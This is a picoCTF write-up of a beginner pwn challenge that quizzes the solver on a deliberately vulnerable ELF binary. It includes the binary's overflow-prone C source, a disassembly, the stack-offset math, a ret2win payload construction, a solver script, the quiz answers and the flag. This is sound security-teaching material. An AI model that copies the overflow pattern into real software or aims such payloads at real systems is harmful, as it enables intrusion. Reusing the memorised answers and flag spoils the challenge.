# picoCTF 2026 - Pwn Challenge Write Up

## Quizploit 

### Challenge Information

#### Description
Solve the quiz.
Download the source code to answer questions here.
Download the binary to answer questions here.
Connect with the challenge instance here: `nc lonely-island.picoctf.net <PORT>`

#### Challenge Rate
- Level: Easy/Beginner
- Point: 50

### Challenge Overview
This is a **binary analysis quiz** wrapped inside a `pwn` challenge container. The server asks **13 (0xD) questions** about the properties of a provided ELF binary — covering ELF metadata, checksec protections, assembly-level analysis, and basic exploitation theory. To retrieve the flag, every question must be answered correctly.

Here is the source code of this binary, which was taken from the challenge:
```c
#include <stdio.h>
#include <stdlib.h>

/*
This is not the challenge, just a template to answer the questions.
To get the flag, answer all the questions. 
There are no bugs in the quiz.
There are 0xD questions in total.

*/

void win(){
    system("cat flag.txt");
}

void vuln(){
    char buffer[0x15] = {0};
    fprintf(stdout, "\nEnter payload: ");
    fgets(buffer, 0x90, stdin);
}

void main(){
    vuln();
}
```

At first glance the source code looks like a textbook **ret2win** buffer overflow:
- `buffer[0x15]` (21 bytes) in `vuln()`
- `fgets(buffer, 0x90, stdin)` reads **144 bytes** into a 21-byte buffer — clear overflow
- A `win()` function exists that calls `system("cat flag.txt")` but is never invoked

Key observations:
- `win()` is a **dead function** — it exists in the binary but no call site references it
- `vuln()` contains a **stack buffer overflow** (21-byte buffer, 144-byte read)
- No stack canary, no PIE — classic pwn setup

So, here is an execution flow for exploit this challenge:
```
_start → __libc_start_main → main() → vuln()
                                         ↓
                               fgets(buffer, 0x90, stdin)
                               [win() exists but is never called]
```

### Binary Analyzing

First, we start with check the binary's information:
```bash
$ file vuln   
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=19251d430d5dd4b44a3e8489a8c76f1894676f7d, for GNU/Linux 3.2.0, not stripped

$ checksec --file=vuln   
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.13/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or /home/kali/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.15.0)
[*] '/home/kali/Desktop/wargame/ploit/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**Key security posture:**
- **NX enabled** — shellcode on the stack won't execute (Q11 answer)
- **No canary** — stack overflow isn't detected at runtime
- **No PIE** — all addresses are fixed at compile time → `win()` always at `0x401176`
- **Partial RELRO** — GOT is partially writable (not relevant here)

Decompiling the binary with IDA, we have the disassembly source code of `vuln()`:
```asm
; int __fastcall vuln(_QWORD, _QWORD, _QWORD)
vuln            proc near               ; CODE XREF: main+D

s               = byte ptr -20h     ; buffer starts at rbp-0x20 (offset 32)
var_18          = qword ptr -18h
var_10          = dword ptr -10h
var_C           = byte ptr -0Ch

endbr64
push    rbp
mov     rbp, rsp
sub     rsp, 20h                    ; allocates 32 bytes on stack
mov     qword ptr [rbp+s], 0       ; zero-initializes buffer[0..7]
mov     [rbp+var_18], 0            ; buffer[8..15] = 0
mov     [rbp+var_10], 0            ; buffer[16..19] = 0
mov     [rbp+var_C], 0             ; buffer[20] = 0 (byte 21, index 0x14)
mov     rax, cs:stdout@GLIBC_2_2_5
mov     rcx, rax                   ; FILE* stream = stdout
mov     edx, 10h                   ; size = 16 (length of "\nEnter payload: ")
mov     esi, 1                     ; count = 1
mov     edi, offset aEnterPayload  ; "\nEnter payload: "
call    _fwrite
mov     rdx, cs:stdin@GLIBC_2_2_5  ; stream = stdin
lea     rax, [rbp+s]               ; rax = &buffer[0]
mov     esi, 90h                   ; n = 0x90 = 144 bytes    ← KEY
mov     rdi, rax                   ; s = &buffer
call    _fgets                     ; fgets(buffer, 144, stdin)
nop
leave
retn
vuln            endp
```

From the disassembly, here is some important point:
| Instruction | Meaning |
|---|---|
| `sub rsp, 20h` | Allocates 32 bytes (0x20) for local variables |
| `s = byte ptr -20h` | `buffer` is at `rbp - 0x20` = 32 bytes below saved RBP |
| `mov esi, 90h` | Second argument to `fgets` = **0x90 = 144 bytes** |
| `call _fgets` | Reads 144 bytes into a 21-byte buffer → **overflow** |

Base on the analyze, we try to calculate the stack layout:
```
High address
┌─────────────────────────────────┐
│        return address            │  ← rbp + 0x8 (target: win = 0x401176)
├─────────────────────────────────┤
│        saved RBP                 │  ← rbp + 0x0  (8 bytes)
├─────────────────────────────────┤  ← rbp
│        padding / stack gap       │  ← rbp - 0x8  (not used)
│        ....                      │  ← rbp - 0x10
│        ....                      │  ← rbp - 0x18
│        buffer[0x15]              │  ← rbp - 0x20  (char buffer[21])
└─────────────────────────────────┘
Low address

Offset to return address = 0x20 (buffer space) + 0x8 (saved RBP) = 0x28 = 40 bytes
```

### Exploitation Path

#### Phase 1 — Reconnaissance

The challenge appeared to be a standard `ret2win` pwn at first. Running `checksec` confirmed:
- **No PIE** → `win()` has a fixed address (`0x401176`)
- **No canary** → stack smashing undetected
- **NX enabled** → can't inject shellcode; must use ROP/ret2win

However, connecting to the server revealed a **text-based quiz** — the actual "exploit" was answering 13 factual questions about the binary.

#### Phase 2 — Question Discovery Strategy

Since we didn't know the question order in advance, we adopted an **iterative discovery loop**:

1. Answer the known question
2. If `Wrong`, the server **re-displays the question text** before the next `>>` prompt
3. Record the actual question
4. Update `solve.py` and re-run from the beginning (server resets on disconnect)

#### Phase 3 — Wrong Answers and Corrections

| Q# | First Attempt | Reason Wrong | Correct Answer |
|----|--------------|--------------|----------------|
| Q3 | `No` | Assumed canary question | `not stripped` |
| Q4 | `No` | Assumed canary question | `0x15` (buffer size in hex) |
| Q6 | `No` | Assumed canary | `yes` (is there a buffer overflow?) |
| Q7 | `No` | Assumed NX | `fgets` (which C function causes overflow?) |
| Q8 | `No` | Assumed NX | `win` (function never called) |
| Q9 | `0x401176` | Assumed win addr | `buffer overflow` (attack type) |
| Q10 | `40` | Assumed offset | `0x7b` (overflow bytes: 0x90 − 0x15) |
| Q11 | `0x401176` | Assumed win addr | `NX` (which protection is enabled?) |
| Q12 | `No` | Assumed canary | `ROP` (technique to bypass NX) |
| Q13 | binary payload | Assumed final exploit | `0x401176` (address of win() in hex) |

#### Phase 4 — Key Calculations

**Buffer size (Q4):**
```
char buffer[0x15] → 0x15 = 21 bytes
```

**fgets read size (Q5):**
```
mov esi, 90h → 0x90 = 144 bytes
```

**Overflow bytes (Q10):**
```
overflow = fgets_size - buffer_size
         = 0x90 - 0x15
         = 0x7B = 123 bytes
```

**Offset to return address:**
```
buffer at:        rbp - 0x20  (32 bytes below saved RBP)
saved RBP at:     rbp + 0x00  (8 bytes)
return address:   rbp + 0x08

offset = 0x20 + 0x08 = 0x28 = 40 bytes
```

**Stack alignment (why `ret` gadget is needed for actual exploit):**
```
x86-64 ABI: RSP must be 16-byte aligned before a CALL instruction.
system() uses movaps (aligned SSE) → will SIGSEGV if misaligned.

Fix: prepend a single `ret` gadget to consume 8 bytes and realign:
payload = b'A'*40 + p64(ret_gadget) + p64(win_addr)
```

#### Phase 5 — The Actual Q13

Confusingly, Q13 asked for `win()`'s **address in hex** — not a binary overflow payload. The quiz was purely theoretical. The hex address `0x401176` triggered the correct response and released the flag.

### Complete Exploit Code
Here is the full exploit code:
```python
#!/usr/bin/env python3
"""
picoCTF - ELF Binary Analysis Quiz
Solver script that automates answering all 13 questions.

Usage: python3 solve.py

All answers derived from:
  - file vuln         → arch, linking, stripped status
  - checksec vuln     → NX, PIE, canary, RELRO
  - IDA / objdump     → buffer size, fgets size, win() address, overflow math
  - assembly analysis → stack layout, offset calculations
"""
from pwn import *

context.log_level = 'warning'

# ── Binary Analysis ────────────────────────────────────────────────────────────
elf = ELF('./vuln', checksec=False)

# win() is at a fixed address (no PIE): 0x401176
win_addr = elf.symbols['win']

# Stack layout of vuln():
#   sub rsp, 0x20     → 32 bytes allocated
#   s = byte ptr -20h → buffer at rbp-0x20
#   saved RBP         → rbp+0x00 (8 bytes)
#   return address    → rbp+0x08
#   OFFSET = 0x20 + 8 = 40 bytes
OFFSET = 40

# ret gadget for 16-byte stack alignment (required by system() on x86-64)
# Without this, movaps in system() will SIGSEGV
rop        = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

# Final ret2win payload (constructed but only needed if server asked for it)
payload = b'A' * OFFSET + p64(ret_gadget) + p64(win_addr)

print(f"[*] win()       = {hex(win_addr)}")
print(f"[*] ret gadget  = {hex(ret_gadget)}")
print(f"[*] OFFSET      = {OFFSET}")
print(f"[*] payload len = {len(payload)} bytes (max fgets: {0x90})")

# ── Remote Connection ──────────────────────────────────────────────────────────
io = remote('lonely-island.picoctf.net', 60676)

# Skip the banner / instructions block
io.recvuntil(b'[*] Question number 0x1:')

# ── State management ───────────────────────────────────────────────────────────
# After a WRONG answer the server re-displays the question ending with >>
# so the next call must NOT call recvuntil(>>) again.
needs_prompt = True

def answer_question(ans, qnum):
    global needs_prompt
    if needs_prompt:
        io.recvuntil(b'>> ')          # wait for input prompt
    needs_prompt = True

    io.sendline(ans.encode() if isinstance(ans, str) else ans)

    response = io.recvuntil(
        [b'Correct', b'Wrong', b'picoCTF', b'flag'],
        timeout=10
    )
    decoded    = response.decode(errors='replace')
    correct    = b'Correct'  in response
    wrong      = b'Wrong'    in response
    flag_found = b'picoCTF'  in response

    status = ('CORRECT' if correct else
              'WRONG'   if wrong    else
              'FLAG'    if flag_found else 'UNKNOWN')
    print(f"Q{qnum:2d} {repr(ans)[:50]:52s} → {status}")

    if wrong:
        retry = io.recvuntil(b'>> ', timeout=5)
        needs_prompt = False   # >> already consumed
        print(f"  [!] Actual Q: {retry.decode(errors='replace').strip()}")

    if flag_found:
        print("\n[+] FLAG:")
        print(decoded)
        extra = io.recvall(timeout=3)
        print(extra.decode(errors='replace'))

    return correct or flag_found

# ── 13 Quiz Answers ────────────────────────────────────────────────────────────

# Q0x1: ELF bitness — `file vuln` → "ELF 64-bit"
answer_question('64-bit', 1)

# Q0x2: Linking — `file vuln` → "dynamically linked"
answer_question('dynamic', 2)

# Q0x3: Stripped — `file vuln` → "not stripped" / checksec → "Stripped: No"
answer_question('not stripped', 3)

# Q0x4: Buffer size — vuln.c: char buffer[0x15] / IDA: s = byte ptr -20h
answer_question('0x15', 4)

# Q0x5: fgets read size — vuln.asm: mov esi, 90h
answer_question('0x90', 5)

# Q0x6: Buffer overflow? — 0x90 bytes read into 0x15 buffer → yes
answer_question('yes', 6)

# Q0x7: Responsible C function — vuln.c / vuln.asm: call _fgets
answer_question('fgets', 7)

# Q0x8: Uncalled function — win() exists but main() only calls vuln()
answer_question('win', 8)

# Q0x9: Attack category — overflow overwriting return address
answer_question('buffer overflow', 9)

# Q0xa: Overflow bytes — 0x90 - 0x15 = 0x7b
answer_question('0x7b', 10)

# Q0xb: Enabled protection — checksec → NX enabled (no canary, no PIE)
answer_question('NX', 11)

# Q0xc: NX bypass technique — Return Oriented Programming
answer_question('ROP', 12)

# Q0xd: Address of win() — no PIE, fixed at 0x401176
answer_question(hex(win_addr), 13)

# ── Collect flag ───────────────────────────────────────────────────────────────
print("\n[*] All questions done - waiting for flag...")
remaining = io.recvall(timeout=5)
print(remaining.decode(errors='replace'))

io.close()
```

Run Result:
```bash
$ python3 -u solve.py

[*] win()       = 0x401176
[*] ret gadget  = 0x40101a
[*] OFFSET      = 40
[*] payload len = 58 bytes (max fgets: 144)
 Q 1 '64-bit'            → CORRECT
 Q 2 'dynamic'           → CORRECT
 Q 3 'not stripped'      → CORRECT
 Q 4 '0x15'              → CORRECT
 Q 5 '0x90'              → CORRECT
 Q 6 'yes'               → CORRECT
 Q 7 'fgets'             → CORRECT
 Q 8 'win'               → CORRECT
 Q 9 'buffer overflow'   → CORRECT
Q10  '0x7b'              → CORRECT
Q11  'NX'                → CORRECT
Q12  'ROP'               → CORRECT
Q13  '0x401176'          → CORRECT

🎉 PERFECT SCORE! 🎉
You got 13/13 questions correct!
Flag: picoCTF{my_bIn@4y_3xpl0it_fL@g_690b52e8}
```